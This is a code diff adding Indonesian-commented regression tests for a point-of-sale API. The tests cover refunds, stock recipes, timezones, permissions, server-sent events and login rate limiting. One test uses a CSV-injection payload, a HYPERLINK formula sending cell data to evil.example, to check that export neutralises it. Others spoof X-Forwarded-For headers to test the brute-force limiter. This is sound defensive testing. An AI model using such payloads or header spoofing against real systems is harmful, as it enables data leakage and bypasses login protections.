@@ -16,6 +16,7 @@ const BASE = `http://127.0.0.1:${PORT}`;
 const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'kasir-api-test-'));
 
 let child = null;
+let child2 = null;   // server kedua (KASIR_TRUST_PROXY=false) untuk tes pembatas login
 const token = {};
 
 async function req(p, { method = 'GET', body, as = 'owner', raw = false } = {}) {
@@ -34,6 +35,12 @@ const must = async (p, opts) => {
   return r.data;
 };
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+/** 'YYYY-MM-DD' digeser N hari (aritmetika tanggal murni). */
+const addDaysStr = (day, n) => {
+  const d = new Date(`${day}T00:00:00Z`);
+  d.setUTCDate(d.getUTCDate() + n);
+  return d.toISOString().slice(0, 10);
+};
 
 /** Tunggu proses anak selesai (atau timeout) tanpa menambah jeda bila sudah exit. */
 function waitExit(proc, ms = 4000) {
@@ -165,6 +172,45 @@ describe('api', () => {
     for (const m of sale.movements.filter((x) => x.type === 'bom_consume')) {
       assert.equal(Math.abs(cat2.raw.find((r) => r.id === m.item_id).stock_qty - before[m.item_id]) < 1e-6, true, `stok ${m.name} pulih`);
     }
+  });
+
+  it('retur lewat API berpagar: 409 saat melebihi sisa, uang tercatat, laporan neto, void ditolak', async () => {
+    // setup deterministik (pajak/pembulatan sudah dinetralkan tes sebelumnya)
+    const raw = await must('/items', { method: 'POST', body: { name: 'Bahan Retur API', item_type: 'raw', unit: 'gr', cost_price: 500, opening_stock: 1000 } });
+    const fin = await must('/items', { method: 'POST', body: { name: 'Kopi Retur API', item_type: 'finished', selling_price: 10000, production_mode: 'make_to_order', tax_mode: 'exempt' } });
+    await must(`/items/${fin.id}/recipe`, { method: 'PUT', body: { recipe: [{ raw_item_id: raw.id, qty: 10 }] } });
+
+    const before = (await must('/reports/summary')).totals;
+    const sale = await must('/sales', { method: 'POST', body: { lines: [{ item_id: fin.id, qty: 2 }] } });
+    assert.equal(sale.grand_total, 20000, '2 x 10.000 tanpa pajak');
+
+    // retur sebagian: 1 dari 2
+    const r1 = await must(`/sales/${sale.id}/refund`, { method: 'POST', body: { item_id: fin.id, qty: 1, reason: 'uji retur' } });
+    assert.equal(r1.refund_amount, 10000, 'uang retur proporsional');
+    assert.equal(r1.remaining_qty, 1);
+    assert.equal(r1.fully_refunded, false);
+
+    // melebihi sisa -> 409 (inti pagar: sebelumnya selalu 200 dan stok digandakan)
+    const r2 = await req(`/sales/${sale.id}/refund`, { method: 'POST', body: { item_id: fin.id, qty: 2, reason: 'uji retur' } });
+    assert.equal(r2.status, 409, 'retur melebihi sisa harus 409: ' + JSON.stringify(r2.data));
+
+    const mid = (await must('/reports/summary')).totals;
+    assert.equal(mid.gross_revenue - before.gross_revenue, 10000, 'omzet menghitung penjualan neto setelah retur sebagian');
+    assert.equal(mid.refund_total - before.refund_total, 10000, 'totals.refund_total tersedia untuk dasbor');
+
+    // sisa 1 -> penuh
+    const r3 = await must(`/sales/${sale.id}/refund`, { method: 'POST', body: { item_id: fin.id, qty: 1, reason: 'uji retur' } });
+    assert.equal(r3.fully_refunded, true);
+    const det = await must(`/sales/${sale.id}`);
+    assert.equal(det.status, 'refunded', 'semua baris penuh -> status refunded');
+    assert.equal(det.items.find((i) => i.item_id === fin.id).refunded_qty, 2, 'refunded_qty tersimpan per baris');
+
+    // setelah itu: retur lagi & pembatalan sama-sama ditolak
+    assert.equal((await req(`/sales/${sale.id}/refund`, { method: 'POST', body: { item_id: fin.id, qty: 1, reason: 'uji' } })).status, 409);
+    const voidTry = await req(`/sales/${sale.id}/void`, { method: 'POST', body: { reason: 'uji' } });
+    assert.equal(voidTry.status, 409, 'void setelah retur ditolak agar stok tidak kembali dua kali');
+    const after = (await must('/reports/summary')).totals;
+    assert.equal(after.refunded - before.refunded, 1, 'struk yang diretur penuh dihitung sebagai refunded');
   });
 
   it('kasir dibloki mengubah setting/pajak/user (RBAC), manajer boleh', async () => {
@@ -441,8 +487,384 @@ describe('api', () => {
   });
 });
 
+// ===========================================================================
+//  Regresi putaran analisis kedua (docs/11-analisis-2026-09-17.md):
+//  order tertahan (#5), header keamanan (#9), pembatas login (#6).
+// ===========================================================================
+describe('penguatan (docs/11)', () => {
+
+  it('snapshot BOM: retur mengembalikan resep SAAT JUAL walau resep sudah diubah', async () => {
+    const raw = await must('/items', { method: 'POST', body: { name: 'Bahan Snapshot API', item_type: 'raw', unit: 'gr', cost_price: 400, opening_stock: 1000 } });
+    const fin = await must('/items', { method: 'POST', body: { name: 'Kopi Snapshot API', item_type: 'finished', selling_price: 15000, production_mode: 'make_to_order', tax_mode: 'exempt' } });
+    await must(`/items/${fin.id}/recipe`, { method: 'PUT', body: { recipe: [{ raw_item_id: raw.id, qty: 20 }] } });
+
+    const stockRaw = async () => ((await must('/pos/catalog')).raw.find((i) => i.id === raw.id)).stock_qty;
+    const before = await stockRaw();
+    const sale = await must('/sales', { method: 'POST', body: { lines: [{ item_id: fin.id, qty: 2 }] } });
+    assert.equal(await stockRaw(), before - 40, 'jual 2 porsi -> 40 gr');
+
+    // detail transaksi menyajikan jejak audit konsumsi (kolom bom_json)
+    const det = await must(`/sales/${sale.id}`);
+    assert.deepEqual(det.items[0].bom, { finished: [], raw: [{ item_id: raw.id, qty: 40 }] }, 'snapshot tersimpan di baris: ' + JSON.stringify(det.items[0].bom));
+
+    // resep dinaikkan 5x SETELAH transaksi
+    await must(`/items/${fin.id}/recipe`, { method: 'PUT', body: { recipe: [{ raw_item_id: raw.id, qty: 100 }] } });
+
+    const ref = await must(`/sales/${sale.id}/refund`, { method: 'POST', body: { item_id: fin.id, qty: 2, reason: 'uji snapshot' } });
+    assert.equal(ref.refund_amount, 30000);
+    assert.equal(await stockRaw(), before, 'yang kembali 40 gr (resep saat jual), BUKAN 200 gr');
+    const mv = (await must(`/sales/${sale.id}`)).movements.filter((m) => m.movement_type === 'return_in');
+    assert.equal(mv.length, 1, 'satu gerakan balik bahan');
+    assert.equal(Math.round(mv[0].qty), 40);
+  });
+
+  it('simulate & retur menghormati forceConsumeRaw saat stok barang jadi ada', async () => {
+    const raw = await must('/items', { method: 'POST', body: { name: 'Bahan MTO API', item_type: 'raw', unit: 'ml', cost_price: 60, opening_stock: 5000 } });
+    const fin = await must('/items', { method: 'POST', body: { name: 'Latte MTO API', item_type: 'finished', selling_price: 26000, production_mode: 'make_to_order', tax_mode: 'exempt' } });
+    await must(`/items/${fin.id}/recipe`, { method: 'PUT', body: { recipe: [{ raw_item_id: raw.id, qty: 120 }] } });
+    await must('/stock/produce', { method: 'POST', body: { item_id: fin.id, qty: 5 } });
+
+    // dulu forceConsumeRaw diabaikan -> deduct_raw kosong & deduct_finished terisi
+    const sim = await must(`/items/${fin.id}/simulate`, { method: 'POST', body: { qty: 1 } });
+    assert.equal(sim.deduct_finished.length, 0, 'stok jadi tidak diklaim untuk penjualan baru');
+    assert.equal(sim.deduct_raw.length, 1, 'bahan baku yang dihitung');
+    assert.equal(sim.deduct_raw[0].qty, 120);
+
+    // jual 1 porsi saat stok jadi ada: barang jadi yang benar-benar dipotong -> snapshot mencatatnya
+    const sale = await must('/sales', { method: 'POST', body: { lines: [{ item_id: fin.id, qty: 1 }] } });
+    const det = await must(`/sales/${sale.id}`);
+    assert.equal(det.items[0].bom.raw.length, 0, 'tidak memotong bahan (stok jadi dipakai)');
+    assert.equal(det.items[0].bom.finished[0].qty, 1, 'snapshot mencatat barang jadi yang dipotong');
+    assert.equal(Math.round((await must('/pos/catalog')).finished.find((i) => i.id === fin.id).stock_qty), 4);
+
+    // retur mengembalikan BARANG JADI (karena itu yang terpotong), bukan bahan
+    await must(`/sales/${sale.id}/refund`, { method: 'POST', body: { item_id: fin.id, qty: 1, reason: 'uji MTO' } });
+    assert.equal(Math.round((await must('/pos/catalog')).finished.find((i) => i.id === fin.id).stock_qty), 5, 'barang jadi kembali');
+  });
+
+  it('zona waktu: hari bisnis laporan, nomor struk & filter tanggal ikut settings.store.timezone', async () => {
+    const { DatabaseSync } = await import('node:sqlite');
+    const dayIn = (tz, at) => new Intl.DateTimeFormat('en-CA', { timeZone: tz, year: 'numeric', month: '2-digit', day: '2-digit' }).format(at);
+
+    // geser zona toko ke dua ekstrem: +14 dan -11 (masing-masing 27 Sep / 26 Sep untuk instan yang sama)
+    const extremes = ['Pacific/Kiritimati', 'Pacific/Midway'];
+    const now = new Date();
+    for (const tz of extremes) {
+      await must('/settings/store', { method: 'PUT', body: { timezone: tz } });
+      const s = await must('/reports/summary');
+      assert.equal(s.period.to, dayIn(tz, now), `default "sampai" harus tanggal bisnis ${tz}`);
+      assert.equal(s.period.from, addDaysStr(s.period.to, -29), '30 hari termasuk hari ini');
+    }
+    assert.ok(extremes.some((tz) => dayIn(tz, now) !== dayIn('UTC', now)),
+      'uji ini hanya bermakna kalau minimal satu zona memang beda tanggal dengan UTC');
+    await must('/settings/store', { method: 'PUT', body: { timezone: 'Asia/Jakarta' } });
+
+    // transaksi pukul 01:00 WIB (= 18:00 UTC hari sebelumnya) harus dihitung pada hari WIB-nya
+    const raw = await must('/items', { method: 'POST', body: { name: 'Bahan TZ API', item_type: 'raw', unit: 'gr', cost_price: 100, opening_stock: 500 } });
+    const fin = await must('/items', { method: 'POST', body: { name: 'Kopi TZ API', item_type: 'finished', selling_price: 9000, production_mode: 'make_to_order', tax_mode: 'exempt' } });
+    await must(`/items/${fin.id}/recipe`, { method: 'PUT', body: { recipe: [{ raw_item_id: raw.id, qty: 5 }] } });
+    const sale = await must('/sales', { method: 'POST', body: { lines: [{ item_id: fin.id, qty: 1 }] } });
+
+    const wibDay = '2026-06-15';                 // hari yang jauh dari data seed (30 hari terakhir)
+    const utcStamp = '2026-06-14 18:00:00';      // 01:00 WIB tanggal 15 Jun
+    const db = new DatabaseSync(path.join(dataDir, 'kasir.db'));
+    db.prepare(`UPDATE transactions SET created_at = ? WHERE id = ?`).run(utcStamp, sale.id);
+    db.prepare(`UPDATE stock_movements SET created_at = ? WHERE ref_id = ? AND ref_type = 'transaction'`).run(utcStamp, sale.id);
+    db.close();
+
+    const onWibDay = await must(`/reports/summary?from=${wibDay}&to=${wibDay}`);
+    assert.equal(onWibDay.totals.tx_count, 1, 'transaksi 01:00 WIB masuk hari WIB-nya');
+    assert.equal(onWibDay.totals.gross_revenue, 9000);
+    assert.ok(onWibDay.by_hour.some((h) => h.hour === 1), `jam sibuk harus jam 1 WIB, dapat: ${JSON.stringify(onWibDay.by_hour)}`);
+    assert.ok(!onWibDay.by_hour.some((h) => h.hour === 18), 'bukan jam 18 (UTC)');
+
+    const onUtcDay = await must(`/reports/summary?from=2026-06-14&to=2026-06-14`);
+    assert.equal(onUtcDay.totals.tx_count, 0, 'tidak lagi bocor ke tanggal UTC hari sebelumnya');
+
+    // filter tanggal di Riwayat Penjualan & Ledger juga memakai hari bisnis toko
+    const hist = await must(`/sales?from=${wibDay}&to=${wibDay}&limit=200`);
+    assert.ok((hist.items || hist).some((r) => r.id === sale.id), 'struk 01:00 WIB muncul di Riwayat tanggal 15 Jun');
+    const histPrev = await must(`/sales?from=2026-06-14&to=2026-06-14&limit=200`);
+    assert.ok(!(histPrev.items || histPrev).some((r) => r.id === sale.id), 'tidak muncul di tanggal UTC-nya');
+    const movs = await must(`/stock/movements?from=${wibDay}&to=${wibDay}&limit=200`);
+    assert.ok((movs.items || movs).some((m) => m.ref_id === sale.id), 'gerakan stok struk itu ikut terfilter di hari WIB-nya');
+  });
+
+  it('permission per blok setting: setting.store tidak bisa mengubah pajak/tema (docs/11 §7)', async () => {
+    const before = (await must('/roles')).roles.find((r) => r.key === 'manager').permissions;
+    assert.ok(before.includes('setting.tax'), 'manager demo punya setting.tax (dasar uji)');
+    try {
+      // turunkan manager menjadi hanya punya setting.store (seperti pratinjau di UI Hak Akses)
+      await must('/roles/manager', { method: 'PUT', body: { permissions: ['setting.store'] } });
+      await must('/auth/login', { method: 'POST', body: { username: 'rina', password: 'rahasia123' } });
+      token.manager = (await must('/auth/login', { method: 'POST', body: { username: 'rina', password: 'rahasia123' } })).token;
+
+      const tax = await req('/settings/tax', { method: 'PUT', as: 'manager', body: { default_rate_pct: 0, enabled: false } });
+      assert.equal(tax.status, 403, 'mengubah PPN butuh setting.tax: ' + JSON.stringify(tax.data));
+      assert.match(String(tax.data.error), /setting\.tax/);
+
+      const theme = await req('/settings/theme', { method: 'PUT', as: 'manager', body: { app_name: 'Diretas' } });
+      assert.equal(theme.status, 403, 'mengubah tema butuh setting.theme');
+
+      const receipt = await req('/settings/receipt', { method: 'PUT', as: 'manager', body: { footer: 'x' } });
+      assert.equal(receipt.status, 403, 'mengubah struk butuh setting.receipt');
+
+      // blok yang memang haknya tetap boleh
+      const store = await req('/settings/store', { method: 'PUT', as: 'manager', body: { phone: '021-555' } });
+      assert.equal(store.status, 200, 'blok store tetap boleh: ' + JSON.stringify(store.data));
+
+      // PPN tidak berubah (bukti tidak ada efek samping)
+      const taxNow = await must('/settings');
+      assert.notEqual(taxNow.tax.default_rate_pct, 0, 'PPN tidak jadi 0');
+    } finally {
+      await must('/roles/manager', { method: 'PUT', body: { permissions: before } });
+    }
+  });
+
+  it('ekspor CSV menetralkan formula spreadsheet (docs/11 §8)', async () => {
+    const raw = await must('/items', { method: 'POST', body: { name: 'Bahan CSV API', item_type: 'raw', unit: 'gr', cost_price: 100, opening_stock: 500 } });
+    const fin = await must('/items', { method: 'POST', body: { name: 'Kopi CSV API', item_type: 'finished', selling_price: 12000, production_mode: 'make_to_order', tax_mode: 'exempt' } });
+    await must(`/items/${fin.id}/recipe`, { method: 'PUT', body: { recipe: [{ raw_item_id: raw.id, qty: 5 }] } });
+
+    const payload = '=HYPERLINK("http://evil.example/?c="&A1,"Klik")';
+    const sale = await must('/sales', { method: 'POST', body: { lines: [{ item_id: fin.id, qty: 1 }], customer_name: payload, customer_phone: '+62812-3456' } });
+    const exp = await req('/reports/export/sales', { raw: true });
+    assert.ok(exp.status < 400, `ekspor gagal: ${exp.status} ${exp.text.slice(0, 200)}`);
+    const csv = exp.text;
+    const line = csv.split('\n').find((l) => l.includes(sale.invoice_no));
+    assert.ok(line, 'baris struk ada di CSV');
+    assert.ok(line.includes(`"'=HYPERLINK`), 'nama pelanggan dinetralkan dengan awalan apostrof: ' + line);
+    assert.ok(!/,"?=HYPERLINK/.test(line), 'tidak ada sel yang dimulai dengan = tanpa netralisasi');
+
+    // kolom uang tetap numerik & negatif tidak ikut dinetralkan
+    const head = csv.split('\n')[0].split(',');
+    const cells = line.split(',');
+    const grand = cells[head.indexOf('grand_total')];
+    assert.equal(grand, '12000', `grand_total tetap angka: ${grand}`);
+    const phone = cells[head.indexOf('customer_name')];
+    assert.ok(phone.length > 0);
+  });
+
+  it('kapasitas porsi memakai SATU rumus (yield_pct dihormati di semua endpoint, docs/11 §11)', async () => {
+    const raw = await must('/items', { method: 'POST', body: { name: 'Bahan Yield API', item_type: 'raw', unit: 'gr', cost_price: 100, opening_stock: 1000 } });
+    // rendemen 50%: 10 gr resep -> butuh 20 gr bahan per porsi; 1000 gr -> 50 porsi
+    const fin = await must('/items', { method: 'POST', body: { name: 'Roti Yield API', item_type: 'finished', selling_price: 20000, production_mode: 'make_to_order', yield_pct: 50, tax_mode: 'exempt' } });
+    await must(`/items/${fin.id}/recipe`, { method: 'PUT', body: { recipe: [{ raw_item_id: raw.id, qty: 10 }] } });
+
+    const sim = await must(`/items/${fin.id}/simulate`, { method: 'POST', body: { qty: 1 } });
+    assert.equal(Math.round(sim.deduct_raw[0].qty * 100) / 100, 20, 'mesin stok: 10 gr / 0,5');
+
+    const cap = (await must('/pos/catalog')).finished.find((i) => i.id === fin.id).capacity;
+    assert.equal(cap, 50, `katalog kasir = 50 porsi (dapat ${cap})`);
+    assert.equal(sim.max_servable, cap, `simulate harus sama dengan katalog: ${sim.max_servable} vs ${cap}`);
+
+    const health = (await must('/stock/health')).items.find((i) => i.id === fin.id);
+    assert.equal(health.serve_capacity, cap, `stock/health harus sama: ${health.serve_capacity} vs ${cap}`);
+    assert.equal(sim.deduct_raw[0].qty * sim.max_servable, 1000, 'kapasitas x kebutuhan = stok bahan');
+
+    // salah input ditolak, bukan dibiarkan (mesin stok meng-clamp diam-diam)
+    assert.equal((await req('/items', { method: 'POST', body: { name: 'Yield salah', item_type: 'finished', yield_pct: 150 } })).status, 400, 'yield > 100% ditolak');
+    assert.equal((await req('/items', { method: 'POST', body: { name: 'Yield nol', item_type: 'finished', yield_pct: 0 } })).status, 400, 'yield 0 ditolak');
+    assert.equal((await req(`/items/${fin.id}`, { method: 'PUT', body: { yield_pct: 120 } })).status, 400, 'update pun ditolak');
+    assert.equal((await must(`/items/${fin.id}`)).yield_pct, 50, 'nilai lama tidak berubah setelah penolakan');
+  });
+
+  it('bootstrap/lite: muatan kecil + catalog_version berubah hanya saat struktur berubah (docs/11 §15)', async () => {
+    const full = await must('/bootstrap');
+    assert.ok(full.catalog.length >= 15 && full.bom, 'bootstrap penuh memuat katalog + BOM');
+    assert.ok(full.catalog_version, 'bootstrap penuh menyertakan catalog_version');
+
+    const lite = await must('/bootstrap/lite');
+    for (const key of ['user', 'permissions', 'store', 'settings', 'alerts_unread', 'catalog_version']) {
+      assert.ok(key in lite, `lite memuat ${key}`);
+    }
+    assert.equal(lite.catalog, undefined, 'katalog TIDAK ikut di lite');
+    assert.equal(lite.bom, undefined, 'BOM tidak ikut di lite');
+    assert.equal(lite.catalog_version, full.catalog_version, 'versi sama dengan bootstrap penuh');
+    assert.ok(JSON.stringify(lite).length * 5 < JSON.stringify(full).length,
+      `lite jauh lebih kecil (${JSON.stringify(lite).length} vs ${JSON.stringify(full).length} byte)`);
+
+    // stok berubah TIDAK mengubah versi (delta stok dikirim lewat SSE, bukan dengan menarik katalog)
+    const raw = await must('/items', { method: 'POST', body: { name: 'Bahan Versi API', item_type: 'raw', unit: 'gr', cost_price: 100, opening_stock: 500 } });
+    const v1 = (await must('/bootstrap/lite')).catalog_version;
+    assert.notEqual(v1, lite.catalog_version, 'barang baru -> versi berubah');
+    await must('/stock/adjust', { method: 'POST', body: { item_id: raw.id, counted_qty: 495, reason: 'uji versi' } });
+    assert.equal((await must('/bootstrap/lite')).catalog_version, v1, 'opname stok -> versi TIDAK berubah');
+
+    await must(`/items/${raw.id}`, { method: 'PUT', body: { selling_price: 4321 } });
+    assert.notEqual((await must('/bootstrap/lite')).catalog_version, v1, 'harga berubah -> versi berubah');
+
+    const fin = await must('/items', { method: 'POST', body: { name: 'Produk Versi API', item_type: 'finished', selling_price: 9000, production_mode: 'make_to_order' } });
+    const v2 = (await must('/bootstrap/lite')).catalog_version;
+    await must(`/items/${fin.id}/recipe`, { method: 'PUT', body: { recipe: [{ raw_item_id: raw.id, qty: 7 }] } });
+    assert.notEqual((await must('/bootstrap/lite')).catalog_version, v2, 'resep berubah -> versi berubah');
+  });
+
+  it('SSE /api/events mengirim gerakan stok setelah commit (docs/11 §15)', async () => {
+    const raw = await must('/items', { method: 'POST', body: { name: 'Bahan SSE API', item_type: 'raw', unit: 'gr', cost_price: 200, opening_stock: 100 } });
+    const res = await fetch(BASE + '/api/events', { headers: { authorization: 'Bearer ' + token.owner } });
+    assert.equal(res.status, 200);
+    assert.match(res.headers.get('content-type') || '', /text\/event-stream/);
+    assert.equal(res.headers.get('cache-control'), 'no-cache, no-transform');
+
+    const reader = res.body.getReader();
+    const dec = new TextDecoder();
+    const events = [];
+    let buf = '';
+    const pump = (async () => {
+      try {
+        for (;;) {
+          const { value, done } = await reader.read();
+          if (done) break;
+          buf += dec.decode(value, { stream: true });
+          const chunks = buf.split('\n\n');
+          buf = chunks.pop();
+          for (const c of chunks) {
+            const line = c.split('\n').find((l) => l.startsWith('data:'));
+            if (line) events.push(JSON.parse(line.slice(5).trim()));
+          }
+        }
+      } catch { /* ditutup di akhir tes */ }
+    })();
+
+    // tunggu sambutan awal
+    for (let i = 0; i < 40 && !events.some((e) => e.type === 'hello'); i += 1) await sleep(25);
+    const hello = events.find((e) => e.type === 'hello');
+    assert.ok(hello, 'event hello terkirim saat koneksi dibuka');
+    assert.ok(hello.catalog_version, 'hello membawa catalog_version');
+
+    // gerakan stok di luar transaksi -> event 'stock'
+    await must('/stock/adjust', { method: 'POST', body: { item_id: raw.id, counted_qty: 75, reason: 'uji SSE' } });
+    for (let i = 0; i < 80 && !events.some((e) => e.type === 'stock'); i += 1) await sleep(25);
+    const stock = events.find((e) => e.type === 'stock');
+    assert.ok(stock, 'event stock diterima tanpa poling');
+    assert.equal(stock.item_id, raw.id);
+    assert.equal(stock.qty, -25);
+    assert.equal(stock.balance_after, 75, `saldo terkirim: ${stock.balance_after}`);
+
+    // penolakan stok (ROLLBACK) tidak boleh menghasilkan event
+    const bahanKurang = await must('/items', { method: 'POST', body: { name: 'Bahan Rollback API', item_type: 'raw', unit: 'gr', cost_price: 100, opening_stock: 1 } });
+    const finProduksi = await must('/items', { method: 'POST', body: { name: 'Produk Rollback API', item_type: 'finished', selling_price: 5000, production_mode: 'make_to_stock' } });
+    await must(`/items/${finProduksi.id}/recipe`, { method: 'PUT', body: { recipe: [{ raw_item_id: bahanKurang.id, qty: 10 }] } });
+    const before = events.length;
+    const bad = await req('/stock/produce', { method: 'POST', body: { item_id: finProduksi.id, qty: 99999 } });
+    assert.equal(bad.status, 409, 'bahan tidak cukup -> 409');
+    await sleep(150);
+    assert.equal(events.length, before, 'tidak ada event dari transaksi yang di-ROLLBACK');
+
+    await reader.cancel().catch(() => {});
+    await pump;
+  });
+
+  it('order tertahan: tahan → daftar → lanjutkan → hapus (dulu 500 storeId is not defined)', async () => {
+    const cat = await must('/pos/catalog', { as: 'cashier' });
+    const item = cat.finished.find((i) => !i.is_non_stock && (i.stock_qty || 0) > 0) || cat.finished[0];
+    assert.ok(item, 'ada barang untuk ditahan');
+
+    const kosong = await req('/pos/hold', { method: 'POST', as: 'cashier', body: { lines: [] } });
+    assert.equal(kosong.status, 400, 'keranjang kosong ditolak 400');
+
+    const hold = await req('/pos/hold', {
+      method: 'POST', as: 'cashier',
+      body: { lines: [{ item_id: item.id, qty: 2 }], customer_name: 'Meja 7', selected_discount_ids: [] },
+    });
+    assert.equal(hold.status, 201, `POST /pos/hold -> ${hold.status} ${JSON.stringify(hold.data).slice(0, 200)}`);
+    assert.match(hold.data.invoice_no, /^HOLD\d{6}/, 'nomor order tertahan terbaca kasir');
+    assert.equal(hold.data.lines.length, 1, 'baris ternormalisasi dikembalikan');
+
+    // dua order pada detik yang sama tidak boleh menabrak uq_tx_invoice
+    const hold2 = await req('/pos/hold', { method: 'POST', as: 'cashier', body: { lines: [{ item_id: item.id, qty: 1 }] } });
+    assert.equal(hold2.status, 201, `hold kedua -> ${hold2.status} ${JSON.stringify(hold2.data).slice(0, 200)}`);
+    assert.notEqual(hold2.data.invoice_no, hold.data.invoice_no, 'nomor hold unik walau dibuat beruntun');
+
+    const held = await must('/pos/held', { as: 'cashier' });
+    assert.ok(held.some((h) => h.id === hold.data.id), 'order muncul di daftar tertahan');
+    assert.equal(held.find((h) => h.id === hold.data.id).customer_name, 'Meja 7', 'nama pelanggan ikut terbawa');
+
+    const detail = await must(`/pos/hold/${hold.data.id}`, { as: 'cashier' });
+    assert.equal(detail.lines[0].item_id, item.id, 'isi keranjang bisa dibaca ulang');
+    assert.equal(detail.lines[0].qty, 2, 'qty utuh untuk dilanjutkan');
+    assert.equal(detail.customer_name, 'Meja 7');
+
+    const del = await req(`/pos/hold/${hold.data.id}`, { method: 'DELETE', as: 'cashier' });
+    assert.equal(del.status, 200, 'hapus order tertahan');
+    const heldAfter = await must('/pos/held', { as: 'cashier' });
+    assert.equal(heldAfter.some((h) => h.id === hold.data.id), false, 'order yang dihapus tidak muncul lagi');
+
+    const notFound = await req(`/pos/hold/${hold.data.id}`, { as: 'cashier' });
+    assert.equal(notFound.status, 404, 'order yang sudah dihapus -> 404');
+    await req(`/pos/hold/${hold2.data.id}`, { method: 'DELETE', as: 'cashier' });   // bersihkan
+  });
+
+  it('order tertahan butuh hak sale.hold (RBAC tetap jalan)', async () => {
+    const inv = await req('/pos/hold', { method: 'POST', as: 'inventory', body: { lines: [{ item_id: 'x', qty: 1 }] } });
+    assert.equal(inv.status, 403, `manajer inventaris -> ${inv.status}`);
+  });
+
+  it('header keamanan: aplikasi tidak boleh dibingkai situs lain', async () => {
+    const r = await req('/health', { as: null, raw: true });
+    const csp = r.headers.get('content-security-policy') || '';
+    assert.ok(csp.includes("frame-ancestors 'self'"), `frame-ancestors harus 'self', dapat: ${csp.slice(0, 160)}`);
+    assert.equal(csp.includes('frame-ancestors *'), false, 'frame-ancestors * membuka clickjacking');
+    assert.ok(csp.includes("object-src 'none'"), 'object-src dinonaktifkan');
+    assert.equal(r.headers.get('x-content-type-options'), 'nosniff');
+  });
+
+  it('X-Forwarded-For palsu tidak melewati pembatas login (ember per-username)', async () => {
+    const username = 'brute-probe-user';
+    const codes = [];
+    const messages = [];
+    for (let i = 0; i < 12; i += 1) {
+      const res = await fetch(BASE + '/api/auth/login', {
+        method: 'POST',
+        headers: { 'content-type': 'application/json', 'x-forwarded-for': `203.0.113.${i + 1}` },  // IP berbeda tiap percobaan
+        body: JSON.stringify({ username, password: 'salah-' + i }),
+      });
+      codes.push(res.status);
+      if (res.status === 429) messages.push((await res.json()).error || '');
+    }
+    assert.ok(codes.includes(429), `harus kena 429 walau IP dipalsukan, dapat: ${codes.join(',')}`);
+    assert.equal(codes[codes.length - 1], 429, 'percobaan terakhir diblokir');
+    assert.ok(codes.filter((c) => c === 401).length <= 10, `401 tidak boleh tak terbatas: ${codes.join(',')}`);
+    assert.ok(messages.some((m) => m.includes('akun ini')), `429 harus dari ember per-username, pesan: ${messages[0] || '-'}`);
+  });
+
+  it('login pemilik tetap berhasil setelah percobaan brute force akun lain', async () => {
+    const r = await req('/auth/login', { method: 'POST', body: { username: 'budi', password: 'rahasia123' } });
+    assert.equal(r.status, 200, `budi -> ${r.status} (tidak boleh kena lockout kolateral)`);
+    assert.ok(r.data.token, 'token diterbitkan');
+  });
+
+  it('KASIR_TRUST_PROXY=false membuat X-Forwarded-For diabaikan (pembatas per-IP jalan)', async () => {
+    const PORT2 = PORT + 200;
+    const srv2 = await spawnAndWait([path.join(ROOT, 'src', 'index.js')], 'Kasir API', {
+      env: { ...process.env, KASIR_DATA_DIR: dataDir, PORT: String(PORT2), KASIR_TRUST_PROXY: 'false' }, ticks: 150,
+    });
+    child2 = srv2.proc;
+    try {
+      const codes = [];
+      const messages = [];
+      for (let i = 0; i < 8; i += 1) {
+        const res = await fetch(`http://127.0.0.1:${PORT2}/api/auth/login`, {
+          method: 'POST',
+          headers: { 'content-type': 'application/json', 'x-forwarded-for': `198.51.100.${i + 1}` },
+          body: JSON.stringify({ username: 'brute-probe-ip-' + i, password: 'salah' }),   // username berbeda: hanya ember IP yang bisa memicu
+        });
+        codes.push(res.status);
+        if (res.status === 429) messages.push((await res.json()).error || '');
+      }
+      assert.ok(codes.includes(429), `XFF harus diabaikan -> 429 per-IP, dapat: ${codes.join(',')}`);
+      assert.ok(messages.some((m) => m.includes('jaringan ini')), `429 harus dari ember per-IP, pesan: ${messages[0] || '-'}`);
+    } finally {
+      try { child2.kill('SIGKILL'); } catch { /* noop */ }
+      child2 = null;
+    }
+  });
+});
+
 process.on('exit', () => {
   if (child) { try { child.kill('SIGKILL'); } catch { /* noop */ } }
+  if (child2) { try { child2.kill('SIGKILL'); } catch { /* noop */ } }
   try { fs.rmSync(dataDir, { recursive: true, force: true }); } catch { /* noop */ }
 });
 
